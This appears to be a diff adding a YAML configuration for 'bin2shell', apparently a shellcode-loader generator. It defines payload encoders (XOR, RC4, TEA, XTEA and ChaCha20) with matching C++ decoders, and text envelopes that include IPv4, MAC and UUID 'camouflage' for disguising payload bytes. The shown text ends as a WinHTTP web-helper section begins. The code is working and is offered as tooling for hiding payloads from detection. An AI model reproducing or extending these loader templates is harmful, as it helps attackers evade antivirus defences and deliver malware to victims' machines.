@@ -1,0 +1,855 @@
+# Project playbook — algorithm definitions for bin2shell
+encoders:
+- index: 0
+  name: passthrough
+  desc: Pass-through identity — raw bytes, no encoding applied
+  python_snippet: |
+    def encode(data: bytes, key: str = "") -> bytes:
+        return data
+  cpp_inverse: |
+    // No additional decoding
+- index: 1
+  name: static_xor_0x42
+  desc: Static single-byte XOR mask — each byte XORed with the constant 0x42
+  python_snippet: |
+    def encode(data: bytes, key: str = "") -> bytes:
+        return bytes(b ^ 0x42 for b in data)
+  cpp_inverse: |
+    // XOR with 0x42
+    for (unsigned int i=0; i<enc_len; ++i) {
+        enc_buf[i] ^= 0x42;
+    }
+- index: 2
+  name: rc4_static
+  desc: RC4 stream cipher with hard-coded 9-byte key — lightweight symmetric encryption
+  python_snippet: |
+    def encode(data: bytes, key: str = "bin2shell") -> bytes:
+        key = key.encode()
+        S = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + S[i] + key[i % len(key)]) % 256
+            S[i], S[j] = S[j], S[i]
+        j = 0; i = 0
+        out = bytearray()
+        for char in data:
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
+            out.append(char ^ S[(S[i] + S[j]) % 256])
+        return bytes(out)
+  cpp_inverse: |
+    // RC4 Decrypt
+    unsigned char S[256];
+    for (int i = 0; i < 256; ++i) S[i] = i;
+    const char* key = "bin2shell";
+    int key_len = 9;
+    for (int i = 0, j = 0; i < 256; ++i) {
+        j = (j + S[i] + key[i % key_len]) % 256;
+        unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+    }
+    for (unsigned int i = 0, x = 0, y = 0; i < enc_len; ++i) {
+        x = (x + 1) % 256;
+        y = (y + S[x]) % 256;
+        unsigned char t = S[x]; S[x] = S[y]; S[y] = t;
+        enc_buf[i] ^= S[(S[x] + S[y]) % 256];
+    }
+- index: 3
+  name: xor_static_key
+  desc: Multi-byte repeating XOR — each byte XORed with a cycled static key string
+  python_snippet: |
+    def encode(data: bytes, key: str = "secret") -> bytes:
+        key_bytes = key.encode()
+        return bytes(data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data)))
+  cpp_inverse: |
+    // Multi-byte repeating XOR dec
+    const char* xor_key = "secret";
+    int xor_key_len = 6;
+    for (unsigned int i = 0; i < enc_len; ++i) {
+        enc_buf[i] ^= xor_key[i % xor_key_len];
+    }
+- index: 4
+  name: additive_shift_13
+  desc: Additive shift cipher — each byte incremented by 13 (modulo 256), classical Caesar variant
+  python_snippet: |
+    def encode(data: bytes, key: str = "") -> bytes:
+        return bytes((b + 13) % 256 for b in data)
+  cpp_inverse: |
+    // Caesar SUB-13 decode
+    for (unsigned int i = 0; i < enc_len; ++i) {
+        enc_buf[i] = (unsigned char)((enc_buf[i] - 13 + 256) % 256);
+    }
+- index: 5
+  name: bit_rotate_left_3
+  desc: Bitwise left rotation by 3 positions — each byte circular-shifted 3 bits left
+  python_snippet: |
+    def encode(data: bytes, key: str = "") -> bytes:
+        return bytes(((b << 3) & 0xFF) | (b >> 5) for b in data)
+  cpp_inverse: |
+    // Bitwise Rotate Right by 3 to decode
+    for (unsigned int i = 0; i < enc_len; ++i) {
+        enc_buf[i] = (unsigned char)((enc_buf[i] >> 3) | ((enc_buf[i] & 0x07) << 5));
+    }
+- index: 6
+  name: rc4_dynamic
+  desc: RC4 stream cipher with per-build cryptographically random 16-byte key — unique every invocation
+  keys_snippet: |
+    def gen_keys():
+        import os
+        return {"rc4_key": os.urandom(16)}
+  python_snippet: |
+    def encode(data: bytes, keys: dict) -> bytes:
+        key = keys["rc4_key"]
+        S = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + S[i] + key[i % len(key)]) % 256
+            S[i], S[j] = S[j], S[i]
+        i = j = 0
+        out = bytearray()
+        for b in data:
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
+            out.append(b ^ S[(S[i] + S[j]) % 256])
+        return bytes(out)
+  cpp_inverse: |
+    // RC4 with random per-build key
+    {
+        unsigned char S[256];
+        for (int i = 0; i < 256; ++i) S[i] = (unsigned char)i;
+        unsigned int j = 0;
+        for (int i = 0; i < 256; ++i) {
+            j = (j + S[i] + rc4_key[i % rc4_key_len]) & 0xFF;
+            unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
+        }
+        unsigned int x = 0, y = 0;
+        for (unsigned int k = 0; k < enc_len; ++k) {
+            x = (x + 1) & 0xFF;
+            y = (y + S[x]) & 0xFF;
+            unsigned char t = S[x]; S[x] = S[y]; S[y] = t;
+            enc_buf[k] ^= S[(S[x] + S[y]) & 0xFF];
+        }
+    }
+- index: 7
+  name: xor_dynamic
+  desc: Multi-byte XOR with per-build cryptographically random 16-byte key — unique every invocation
+  keys_snippet: |
+    def gen_keys():
+        import os
+        return {"xor_key": os.urandom(16)}
+  python_snippet: |
+    def encode(data: bytes, keys: dict) -> bytes:
+        k = keys["xor_key"]
+        return bytes(data[i] ^ k[i % len(k)] for i in range(len(data)))
+  cpp_inverse: |
+    // Multi-byte XOR with random per-build key
+    for (unsigned int i = 0; i < enc_len; ++i) {
+        enc_buf[i] ^= xor_key[i % xor_key_len];
+    }
+- index: 8
+  name: tea_ctr
+  desc: Tiny Encryption Algorithm in CTR mode — 32-round Feistel network, 64-bit block, per-build random 128-bit key
+  keys_snippet: |
+    def gen_keys():
+        import os
+        return {"tea_key": os.urandom(16)}
+  python_snippet: |
+    def encode(data: bytes, keys: dict) -> bytes:
+        import struct
+        k = struct.unpack("<4I", keys["tea_key"])
+        DELTA = 0x9E3779B9
+        out = bytearray()
+        for block_index in range((len(data) + 7) // 8):
+            v0, v1 = block_index, 0
+            s = 0
+            for _ in range(32):
+                s = (s + DELTA) & 0xFFFFFFFF
+                v0 = (v0 + (((v1 << 4) + k[0]) ^ (v1 + s) ^ ((v1 >> 5) + k[1]))) & 0xFFFFFFFF
+                v1 = (v1 + (((v0 << 4) + k[2]) ^ (v0 + s) ^ ((v0 >> 5) + k[3]))) & 0xFFFFFFFF
+            ks = struct.pack("<2I", v0, v1)
+            chunk = data[block_index * 8 : block_index * 8 + 8]
+            out.extend(c ^ k_ for c, k_ in zip(chunk, ks))
+        return bytes(out)
+  cpp_inverse: |
+    // TEA-CTR (32 rounds, 64-bit block, 128-bit random key) — symmetric: same as encode
+    {
+        unsigned int k0 = (unsigned int)tea_key[ 0] | ((unsigned int)tea_key[ 1]<<8) | ((unsigned int)tea_key[ 2]<<16) | ((unsigned int)tea_key[ 3]<<24);
+        unsigned int k1 = (unsigned int)tea_key[ 4] | ((unsigned int)tea_key[ 5]<<8) | ((unsigned int)tea_key[ 6]<<16) | ((unsigned int)tea_key[ 7]<<24);
+        unsigned int k2 = (unsigned int)tea_key[ 8] | ((unsigned int)tea_key[ 9]<<8) | ((unsigned int)tea_key[10]<<16) | ((unsigned int)tea_key[11]<<24);
+        unsigned int k3 = (unsigned int)tea_key[12] | ((unsigned int)tea_key[13]<<8) | ((unsigned int)tea_key[14]<<16) | ((unsigned int)tea_key[15]<<24);
+        const unsigned int DELTA = 0x9E3779B9u;
+        for (unsigned int bi = 0; bi * 8u < enc_len; ++bi) {
+            unsigned int v0 = bi, v1 = 0u, s = 0u;
+            for (int r = 0; r < 32; ++r) {
+                s += DELTA;
+                v0 += ((v1 << 4) + k0) ^ (v1 + s) ^ ((v1 >> 5) + k1);
+                v1 += ((v0 << 4) + k2) ^ (v0 + s) ^ ((v0 >> 5) + k3);
+            }
+            unsigned char ks[8] = {
+                (unsigned char)(v0      ), (unsigned char)(v0 >>  8),
+                (unsigned char)(v0 >> 16), (unsigned char)(v0 >> 24),
+                (unsigned char)(v1      ), (unsigned char)(v1 >>  8),
+                (unsigned char)(v1 >> 16), (unsigned char)(v1 >> 24),
+            };
+            for (unsigned int i = 0; i < 8 && bi * 8u + i < enc_len; ++i) {
+                enc_buf[bi * 8u + i] ^= ks[i];
+            }
+        }
+    }
+- index: 9
+  name: xtea_ctr
+  desc: eXtended TEA in CTR mode — hardened 32-round Feistel variant with per-build random 128-bit key
+  keys_snippet: |
+    def gen_keys():
+        import os
+        return {"xtea_key": os.urandom(16)}
+  python_snippet: |
+    def encode(data: bytes, keys: dict) -> bytes:
+        import struct
+        k = struct.unpack("<4I", keys["xtea_key"])
+        DELTA = 0x9E3779B9
+        out = bytearray()
+        for block_index in range((len(data) + 7) // 8):
+            v0, v1 = block_index, 0
+            s = 0
+            for _ in range(32):
+                v0 = (v0 + ((((v1 << 4) ^ (v1 >> 5)) + v1) ^ (s + k[s & 3]))) & 0xFFFFFFFF
+                s = (s + DELTA) & 0xFFFFFFFF
+                v1 = (v1 + ((((v0 << 4) ^ (v0 >> 5)) + v0) ^ (s + k[(s >> 11) & 3]))) & 0xFFFFFFFF
+            ks = struct.pack("<2I", v0, v1)
+            chunk = data[block_index * 8 : block_index * 8 + 8]
+            out.extend(c ^ k_ for c, k_ in zip(chunk, ks))
+        return bytes(out)
+  cpp_inverse: |
+    // XTEA-CTR (random 128-bit key) — symmetric stream-mode decode
+    {
+        unsigned int k[4];
+        for (int i = 0; i < 4; ++i) {
+            k[i] = (unsigned int)xtea_key[i*4 + 0]
+                 | ((unsigned int)xtea_key[i*4 + 1] << 8)
+                 | ((unsigned int)xtea_key[i*4 + 2] << 16)
+                 | ((unsigned int)xtea_key[i*4 + 3] << 24);
+        }
+        const unsigned int DELTA = 0x9E3779B9u;
+        for (unsigned int bi = 0; bi * 8u < enc_len; ++bi) {
+            unsigned int v0 = bi, v1 = 0u, s = 0u;
+            for (int r = 0; r < 32; ++r) {
+                v0 += ((((v1 << 4) ^ (v1 >> 5)) + v1) ^ (s + k[s & 3]));
+                s += DELTA;
+                v1 += ((((v0 << 4) ^ (v0 >> 5)) + v0) ^ (s + k[(s >> 11) & 3]));
+            }
+            unsigned char ks[8] = {
+                (unsigned char)(v0      ), (unsigned char)(v0 >>  8),
+                (unsigned char)(v0 >> 16), (unsigned char)(v0 >> 24),
+                (unsigned char)(v1      ), (unsigned char)(v1 >>  8),
+                (unsigned char)(v1 >> 16), (unsigned char)(v1 >> 24),
+            };
+            for (unsigned int i = 0; i < 8 && bi * 8u + i < enc_len; ++i) {
+                enc_buf[bi * 8u + i] ^= ks[i];
+            }
+        }
+    }
+- index: 10
+  name: chacha20
+  desc: ChaCha20 stream cipher (RFC 8439) — per-build random 256-bit key and 96-bit nonce, highest-security option
+  keys_snippet: |
+    def gen_keys():
+        import os
+        return {"chacha_key": os.urandom(32), "chacha_nonce": os.urandom(12)}
+  python_snippet: |
+    def encode(data: bytes, keys: dict) -> bytes:
+        import struct
+        key = keys["chacha_key"]; nonce = keys["chacha_nonce"]
+        def rotl(a, b): return ((a << b) & 0xFFFFFFFF) | (a >> (32 - b))
+        def quarter(s, a, b, c, d):
+            s[a] = (s[a] + s[b]) & 0xFFFFFFFF; s[d] = rotl(s[d] ^ s[a], 16)
+            s[c] = (s[c] + s[d]) & 0xFFFFFFFF; s[b] = rotl(s[b] ^ s[c], 12)
+            s[a] = (s[a] + s[b]) & 0xFFFFFFFF; s[d] = rotl(s[d] ^ s[a], 8)
+            s[c] = (s[c] + s[d]) & 0xFFFFFFFF; s[b] = rotl(s[b] ^ s[c], 7)
+        const = (0x61707865, 0x3320646E, 0x79622D32, 0x6B206574)
+        key_words = struct.unpack("<8I", key)
+        nonce_words = struct.unpack("<3I", nonce)
+        out = bytearray()
+        for counter in range((len(data) + 63) // 64):
+            state = list(const) + list(key_words) + [counter] + list(nonce_words)
+            working = state[:]
+            for _ in range(10):
+                quarter(working, 0, 4,  8, 12); quarter(working, 1, 5,  9, 13)
+                quarter(working, 2, 6, 10, 14); quarter(working, 3, 7, 11, 15)
+                quarter(working, 0, 5, 10, 15); quarter(working, 1, 6, 11, 12)
+                quarter(working, 2, 7,  8, 13); quarter(working, 3, 4,  9, 14)
+            keystream = b"".join(struct.pack("<I", (working[i] + state[i]) & 0xFFFFFFFF) for i in range(16))
+            chunk = data[counter * 64 : counter * 64 + 64]
+            out.extend(c ^ k for c, k in zip(chunk, keystream))
+        return bytes(out)
+  cpp_inverse: |
+    // ChaCha20 stream cipher (RFC 8439), random 256-bit key + 96-bit nonce — symmetric
+    {
+        auto rotl32 = [](unsigned int x, int n) -> unsigned int {
+            return (x << n) | (x >> (32 - n));
+        };
+        auto load_le = [](const unsigned char* p) -> unsigned int {
+            return (unsigned int)p[0] | ((unsigned int)p[1] << 8)
+                 | ((unsigned int)p[2] << 16) | ((unsigned int)p[3] << 24);
+        };
+        unsigned int key_words[8];
+        for (int i = 0; i < 8; ++i) key_words[i] = load_le(chacha_key + i * 4);
+        unsigned int nonce_words[3];
+        for (int i = 0; i < 3; ++i) nonce_words[i] = load_le(chacha_nonce + i * 4);
+        const unsigned int CONSTS[4] = { 0x61707865u, 0x3320646Eu, 0x79622D32u, 0x6B206574u };
+        for (unsigned int counter = 0; counter * 64u < enc_len; ++counter) {
+            unsigned int state[16];
+            for (int i = 0; i < 4; ++i) state[i]      = CONSTS[i];
+            for (int i = 0; i < 8; ++i) state[4 + i]  = key_words[i];
+            state[12] = counter;
+            for (int i = 0; i < 3; ++i) state[13 + i] = nonce_words[i];
+            unsigned int w[16];
+            for (int i = 0; i < 16; ++i) w[i] = state[i];
+            for (int r = 0; r < 10; ++r) {
+                #define QR(a,b,c,d) \
+                    w[a]+=w[b]; w[d]=rotl32(w[d]^w[a],16); \
+                    w[c]+=w[d]; w[b]=rotl32(w[b]^w[c],12); \
+                    w[a]+=w[b]; w[d]=rotl32(w[d]^w[a], 8); \
+                    w[c]+=w[d]; w[b]=rotl32(w[b]^w[c], 7)
+                QR(0,4, 8,12); QR(1,5, 9,13); QR(2,6,10,14); QR(3,7,11,15);
+                QR(0,5,10,15); QR(1,6,11,12); QR(2,7, 8,13); QR(3,4, 9,14);
+                #undef QR
+            }
+            unsigned char ks[64];
+            for (int i = 0; i < 16; ++i) {
+                unsigned int v = w[i] + state[i];
+                ks[i*4+0] = (unsigned char)(v      );
+                ks[i*4+1] = (unsigned char)(v >>  8);
+                ks[i*4+2] = (unsigned char)(v >> 16);
+                ks[i*4+3] = (unsigned char)(v >> 24);
+            }
+            for (unsigned int i = 0; i < 64 && counter * 64u + i < enc_len; ++i) {
+                enc_buf[counter * 64u + i] ^= ks[i];
+            }
+        }
+    }
+envelopes:
+- index: 0
+  name: bare_bytes
+  desc: No envelope — emit the raw encoded byte array directly, minimal footprint
+  python_snippet: |
+    def envelope(data: bytes) -> str:
+        return ""
+  cpp_decode: |
+    // envelope 'none' is handled in the generator; this is a no-op stub
+- index: 1
+  name: base91
+  desc: Compact binary-to-text encoding — denser than Base64, produces shorter output strings
+  python_snippet: |
+    # defines: envelope(data: bytes) -> str
+    B91_ALPH = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"'
+    def envelope(data: bytes) -> str:
+        if not data: return ""
+        v = 0
+        b = 0
+        out = []
+        for x in data:
+            v |= (x & 0xFF) << b
+            b += 8
+            while b > 13:
+                val = v & 8191
+                if val > 88:
+                    v >>= 13; b -= 13
+                else:
+                    val = v & 16383; v >>= 14; b -= 14
+                out.append(B91_ALPH[val % 91])
+                out.append(B91_ALPH[val // 91])
+        if b:
+            out.append(B91_ALPH[v % 91])
+            if b > 7 or v > 90:
+                out.append(B91_ALPH[v // 91])
+        return "".join(out)
+  cpp_decode: |
+    const char* B91_ALPH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
+    int b91_dec[256];
+    for (int i = 0; i < 256; ++i) b91_dec[i] = -1;
+    for (int i = 0; i < 91; ++i) b91_dec[(unsigned char)B91_ALPH[i]] = i;
+
+    unsigned int enc_cap = (code_blob_text_len * 13u) / 14u + 8u;
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+
+    unsigned int b = 0, n = 0;
+    int v = -1;
+    for (unsigned int i = 0; i < code_blob_text_len; ++i) {
+        unsigned char c = (unsigned char)code_blob_text[i];
+        int d = (c < 256) ? b91_dec[c] : -1;
+        if (d < 0) continue;
+        if (v < 0) v = d;
+        else {
+            v += d * 91;
+            b |= (unsigned int)v << n;
+            n += ((v & 8191) > 88) ? 13u : 14u;
+            do {
+                enc_buf[enc_len++] = (unsigned char)(b & 0xFFu);
+                b >>= 8u;
+                n -= 8u;
+            } while (n > 7u);
+            v = -1;
+        }
+    }
+    if (v >= 0) {
+        enc_buf[enc_len++] = (unsigned char)((b | (unsigned int)v << n) & 0xFFu);
+    }
+- index: 2
+  name: base64
+  desc: Standard Base64 encoding (RFC 4648) — the most widely compatible binary-to-text format
+  python_snippet: |
+    import base64
+    def envelope(data: bytes) -> str:
+        return base64.b64encode(data).decode('ascii')
+  cpp_decode: |
+    // naive inline Base64 decode (ASCII only, ignores whitespace)
+    int B64_DEC[256]; for (int i=0;i<256;++i) B64_DEC[i]=-1;
+    {
+        const char* alpha="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        for (int i=0;i<64;++i) B64_DEC[(unsigned char)alpha[i]] = i;
+    }
+    unsigned char* enc_buf = new unsigned char[(code_blob_text_len * 3u)/4u + 3u];
+    unsigned int enc_len = 0;
+    unsigned int val = 0; int valb = -8;
+    for (unsigned int i=0;i<code_blob_text_len;++i){
+        int d = B64_DEC[(unsigned char)code_blob_text[i]];
+        if (d == -1) continue;
+        val = (val<<6) | (unsigned)d; valb += 6;
+        if (valb >= 0) {
+            enc_buf[enc_len++] = (unsigned char)((val>>valb)&0xFFu);
+            valb -= 8;
+        }
+    }
+- index: 3
+  name: base32
+  desc: Base32 encoding (RFC 4648) — case-insensitive, human-readable alphabet of A-Z and 2-7
+  python_snippet: |
+    import base64
+    def envelope(data: bytes) -> str:
+        return base64.b32encode(data).decode('ascii')
+  cpp_decode: |
+    // naive inline Base32 decode (RFC 4648 alphabet), ignores non-alphabet and '=' padding
+    int B32_DEC[256]; for (int i=0;i<256;++i) B32_DEC[i] = -1;
+    {
+        const char* alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+        for (int i=0;i<32;++i) B32_DEC[(unsigned char)alpha[i]] = i;
+    }
+    unsigned int enc_cap = (code_blob_text_len * 5u) / 8u + 8u;
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+    unsigned int val = 0; int valb = -8;
+    for (unsigned int i=0;i<code_blob_text_len;++i) {
+        unsigned char c = (unsigned char)code_blob_text[i];
+        if (c == '=') continue; // skip padding
+        int d = B32_DEC[c];
+        if (d == -1) continue; // skip non-alphabet
+        val = (val << 5) | (unsigned)d; valb += 5;
+        if (valb >= 0) {
+            enc_buf[enc_len++] = (unsigned char)((val >> valb) & 0xFFu);
+            valb -= 8;
+        }
+    }
+- index: 4
+  name: hex
+  desc: Hexadecimal Base16 encoding — simple, universally parseable, double the original size
+  python_snippet: |
+    def envelope(data: bytes) -> str:
+        return data.hex()
+  cpp_decode: |
+    // Hex (Base16) decode
+    int HEX_DEC[256]; for (int i=0;i<256;++i) HEX_DEC[i] = -1;
+    for (int i=0;i<10;++i) { HEX_DEC['0'+i] = i; }
+    for (int i=0;i<6;++i) { HEX_DEC['a'+i] = 10+i; HEX_DEC['A'+i] = 10+i; }
+
+    unsigned int enc_cap = (code_blob_text_len / 2) + 1;
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+    int high_nibble = -1;
+    for (unsigned int i=0;i<code_blob_text_len;++i) {
+        int d = HEX_DEC[(unsigned char)code_blob_text[i]];
+        if (d == -1) continue; // skip invalid (e.g., whitespace)
+        if (high_nibble == -1) {
+            high_nibble = d;
+        } else {
+            enc_buf[enc_len++] = (unsigned char)((high_nibble << 4) | d);
+            high_nibble = -1;
+        }
+    }
+- index: 5
+  name: base58
+  desc: Bitcoin-style Base58 — visually unambiguous alphabet (no 0/O/I/l), compact and URL-safe
+  python_snippet: |
+    def envelope(data: bytes) -> str:
+        ALPHABET = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+        v = int.from_bytes(data, 'big')
+        out = bytearray()
+        while v > 0:
+            v, mod = divmod(v, 58)
+            out.append(ALPHABET[mod])
+        for b in data:
+            if b != 0: break
+            out.append(ALPHABET[0])
+        return out[::-1].decode('ascii')
+  cpp_decode: |
+    // Base58 decode
+    const char* B58_ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    int b58_dec[256];
+    for (int i = 0; i < 256; ++i) b58_dec[i] = -1;
+    for (int i = 0; i < 58; ++i) b58_dec[(unsigned char)B58_ALPH[i]] = i;
+
+    unsigned int enc_cap = code_blob_text_len; // More than enough
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    for (unsigned int i = 0; i < enc_cap; ++i) enc_buf[i] = 0;
+
+    unsigned int out_len = 0;
+    int zeroes = 0;
+    bool leading_zeroes = true;
+
+    for (unsigned int i = 0; i < code_blob_text_len; ++i) {
+        int d = b58_dec[(unsigned char)code_blob_text[i]];
+        if (d == -1) continue;
+        if (leading_zeroes && d == 0) zeroes++;
+        else leading_zeroes = false;
+
+        unsigned int c = d;
+        for (unsigned int j = enc_cap; j > enc_cap - out_len; --j) {
+            c += enc_buf[j - 1] * 58;
+            enc_buf[j - 1] = c & 0xFF;
+            c >>= 8;
+        }
+        while (c > 0) {
+            out_len++;
+            enc_buf[enc_cap - out_len] = c & 0xFF;
+            c >>= 8;
+        }
+    }
+
+    for (int i = 0; i < zeroes; ++i) {
+        out_len++;
+        enc_buf[enc_cap - out_len] = 0;
+    }
+
+    // Compact payload down to base 0 index
+    for(unsigned int i = 0; i < out_len; ++i){
+        enc_buf[i] = enc_buf[enc_cap - out_len + i];
+    }
+    unsigned int enc_len = out_len;
+- index: 6
+  name: base85
+  desc: Ascii85 / Adobe Base85 — high-density encoding, 4 raw bytes → 5 printable ASCII characters
+  python_snippet: |
+    import base64
+    def envelope(data: bytes) -> str:
+        return base64.b85encode(data).decode('ascii')
+  cpp_decode: |
+    // Base85 decode (RFC 1924 variant, used by Python b85encode)
+    const char* B85_ALPH = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~";
+    int b85_dec[256];
+    for (int i = 0; i < 256; ++i) b85_dec[i] = -1;
+    for (int i = 0; i < 85; ++i) b85_dec[(unsigned char)B85_ALPH[i]] = i;
+
+    unsigned int enc_cap = (code_blob_text_len * 4) / 5 + 4;
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+
+    unsigned int tuple = 0;
+    int count = 0;
+    for (unsigned int i = 0; i < code_blob_text_len; ++i) {
+        int d = b85_dec[(unsigned char)code_blob_text[i]];
+        if (d == -1) continue;
+        tuple = tuple * 85 + d;
+        count++;
+        if (count == 5) {
+            enc_buf[enc_len++] = (unsigned char)(tuple >> 24);
+            enc_buf[enc_len++] = (unsigned char)(tuple >> 16);
+            enc_buf[enc_len++] = (unsigned char)(tuple >> 8);
+            enc_buf[enc_len++] = (unsigned char)(tuple);
+            tuple = 0;
+            count = 0;
+        }
+    }
+    if (count > 0) {
+        for (int i = count; i < 5; ++i) tuple = tuple * 85 + 84;
+        for (int i = 0; i < count - 1; ++i) {
+            enc_buf[enc_len++] = (unsigned char)(tuple >> (24 - 8 * i));
+        }
+    }
+- index: 7
+  name: ipv4_array
+  desc: IPv4 address list camouflage — encodes payload bytes as a comma-separated list of valid-looking IPv4 addresses
+  python_snippet: |
+    def envelope(data: bytes) -> str:
+        padded = data + b'\x00' * ((4 - len(data) % 4) % 4)
+        out = []
+        for i in range(0, len(padded), 4):
+            out.append(f"{padded[i]}.{padded[i+1]}.{padded[i+2]}.{padded[i+3]}")
+        return ", ".join(out)
+  cpp_decode: |
+    // IPv4 address array decoder
+    unsigned int enc_cap = code_blob_text_len; // upper bound
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+
+    unsigned int current_val = 0;
+    bool in_num = false;
+    for (unsigned int i = 0; i < code_blob_text_len; ++i) {
+        char c = code_blob_text[i];
+        if (c >= '0' && c <= '9') {
+            current_val = current_val * 10 + (c - '0');
+            in_num = true;
+        } else if (c == '.' || c == ',') {
+            if (in_num) {
+                enc_buf[enc_len++] = (unsigned char)current_val;
+                current_val = 0;
+                in_num = false;
+            }
+        }
+    }
+    if (in_num) {
+        enc_buf[enc_len++] = (unsigned char)current_val;
+    }
+- index: 8
+  name: mac_array
+  desc: MAC address list camouflage — encodes payload bytes as a comma-separated list of IEEE 802 MAC addresses
+  python_snippet: |
+    def envelope(data: bytes) -> str:
+        padded = data + b'\x00' * ((6 - len(data) % 6) % 6)
+        out = []
+        for i in range(0, len(padded), 6):
+            mac = "-".join(f"{b:02X}" for b in padded[i:i+6])
+            out.append(mac)
+        return ", ".join(out)
+  cpp_decode: "// MAC address array decoder (Essentially a Hex Decoder that ignores\
+    \ formatting)\nint HEX_DEC[256]; for (int i=0;i<256;++i) HEX_DEC[i] = -1;\nfor\
+    \ (int i=0;i<10;++i) { HEX_DEC['0'+i] = i; }\nfor (int i=0;i<6;++i) { HEX_DEC['a'+i]\
+    \ = 10+i; HEX_DEC['A'+i] = 10+i; }\n\nunsigned int enc_cap = code_blob_text_len;\
+    \ \nunsigned char* enc_buf = new unsigned char[enc_cap];\nunsigned int enc_len\
+    \ = 0;\nint high_nibble = -1;\n\nfor (unsigned int i = 0; i < code_blob_text_len;\
+    \ ++i) {\n    int d = HEX_DEC[(unsigned char)code_blob_text[i]];\n    if (d ==\
+    \ -1) continue; // skip hyphens, spaces, commas\n    if (high_nibble == -1) {\n\
+    \        high_nibble = d;\n    } else {\n        enc_buf[enc_len++] = (unsigned\
+    \ char)((high_nibble << 4) | d);\n        high_nibble = -1;\n    }\n}\n"
+- index: 9
+  name: uuid_array
+  desc: UUID list camouflage — encodes payload bytes as an array of RFC 4122 UUID string literals (little-endian)
+  python_snippet: |
+    import uuid
+    def envelope(data: bytes) -> str:
+        padded = data + b'\x00' * ((16 - len(data) % 16) % 16)
+        out = []
+        for i in range(0, len(padded), 16):
+            chunk = padded[i:i+16]
+            out.append(str(uuid.UUID(bytes_le=chunk)))
+        return ",\n".join(out)
+  cpp_decode: |
+    // UUID array decoder (Little Endian bytes mapping)
+    int HEX_DEC[256]; for (int i=0;i<256;++i) HEX_DEC[i] = -1;
+    for (int i=0;i<10;++i) { HEX_DEC['0'+i] = i; }
+    for (int i=0;i<6;++i) { HEX_DEC['a'+i] = 10+i; HEX_DEC['A'+i] = 10+i; }
+
+    unsigned int enc_cap = code_blob_text_len;
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+
+    unsigned char uuid_bytes[16];
+    int uuid_idx = 0;
+    int high_nibble = -1;
+
+    for (unsigned int i = 0; i < code_blob_text_len; ++i) {
+        int d = HEX_DEC[(unsigned char)code_blob_text[i]];
+        if (d == -1) continue;
+        if (high_nibble == -1) {
+            high_nibble = d;
+        } else {
+            uuid_bytes[uuid_idx++] = (unsigned char)((high_nibble << 4) | d);
+            high_nibble = -1;
+            if (uuid_idx == 16) {
+                // Microsoft UUIDs encode the first 3 groups as Little Endian, so we swap them
+                enc_buf[enc_len++] = uuid_bytes[3]; enc_buf[enc_len++] = uuid_bytes[2];
+                enc_buf[enc_len++] = uuid_bytes[1]; enc_buf[enc_len++] = uuid_bytes[0];
+                enc_buf[enc_len++] = uuid_bytes[5]; enc_buf[enc_len++] = uuid_bytes[4];
+                enc_buf[enc_len++] = uuid_bytes[7]; enc_buf[enc_len++] = uuid_bytes[6];
+                for (int j = 8; j < 16; j++) enc_buf[enc_len++] = uuid_bytes[j];
+                uuid_idx = 0;
+            }
+        }
+    }
+- index: 10
+  name: base32hex
+  desc: Base32Hex encoding (RFC 4648 §7) — extended hex alphabet 0-9 A-V, avoids ambiguous characters
+  python_snippet: |
+    import base64
+    def envelope(data: bytes) -> str:
+        alphabet = b"0123456789ABCDEFGHIJKLMNOPQRSTUV"
+        standard = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+        trans = bytes.maketrans(standard, alphabet)
+        return base64.b32encode(data).translate(trans).decode("ascii")
+  cpp_decode: |
+    // Base32Hex Decode
+    int B32H_DEC[256]; for (int i=0;i<256;++i) B32H_DEC[i] = -1;
+    {
+        const char* alpha = "0123456789ABCDEFGHIJKLMNOPQRSTUV";
+        for (int i=0;i<32;++i) B32H_DEC[(unsigned char)alpha[i]] = i;
+    }
+    unsigned int enc_cap = (code_blob_text_len * 5u) / 8u + 8u;
+    unsigned char* enc_buf = new unsigned char[enc_cap];
+    unsigned int enc_len = 0;
+    unsigned int val = 0; int valb = -8;
+    for (unsigned int i=0;i<code_blob_text_len;++i) {
+        unsigned char c = (unsigned char)code_blob_text[i];
+        if (c == '=') continue;
+        int d = B32H_DEC[c];
+        if (d == -1) continue;
+        val = (val << 5) | (unsigned)d; valb += 5;
+        if (valb >= 0) {
+            enc_buf[enc_len++] = (unsigned char)((val >> valb) & 0xFFu);
+            valb -= 8;
+        }
+    }
+web_helpers:
+- index: 0
+  name: winhttp
+  desc: Windows WinHTTP API — native HTTP client, TLS support, no external dependencies beyond system libs
+  cpp_includes: |
+    #include <stdexcept>
+    #include <string>
+    #include <vector>
+    #include <windows.h>
+    #include <winhttp.h>
+    #pragma comment(lib, "winhttp.lib")
